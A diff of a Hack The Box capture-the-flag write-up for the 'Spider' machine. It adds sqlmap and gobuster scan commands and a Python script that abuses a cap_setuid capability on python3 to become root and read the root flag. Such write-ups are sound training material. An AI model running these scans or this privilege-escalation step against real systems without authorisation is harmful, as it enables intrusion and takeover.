@@ -252,15 +252,16 @@ No sign of other ports being open. Lets visits the HTML page
 It appear to be a security dashboard. We appear to be login as a the user *Nathan*
 an fix for possible user. 
 There is a search field on the website which makes a get request to the server, lets test to see if it vulnerable to SQLi. 
-
+#sqlmap
 ```
 sqlmap -u http://spider.htb/?search=test --level 5 --risk 3 --dbs
 ```
 
 Nothing from the SQLmap 
 Lets also do a quick gobuster 
+#gobuster
 ````bash
-gobuster dir -u http**4**://spider.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 50 -k
+gobuster dir -u http://spider.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -t 50 -k
 \===============================================================  
 Gobuster v3.1.0  
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
@@ -326,6 +327,20 @@ We start as always using the command *sudo -l * to check if we can run anything 
 
 lets use [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to see if there anything we can exploit. 
 
-Transfer it over to the box using wget 
+Transfer it over to the box using wget, and lets see if there anything we can use to get root
 
-|
+We see that python3 is set to cap_setuid which allow us to set the id when running python3
+
+```
+/usr/bin/python3.8 = cap\_setuid,cap\_net\_bind\_service+eip
+```
+
+Lets create a small script we can use to exploit this. 
+
+ ```
+ import os 
+ os.setuid(0)
+ os.system("cat /root/root.txt")
+ ```
+ 
+ Run the script and we got the flag. 
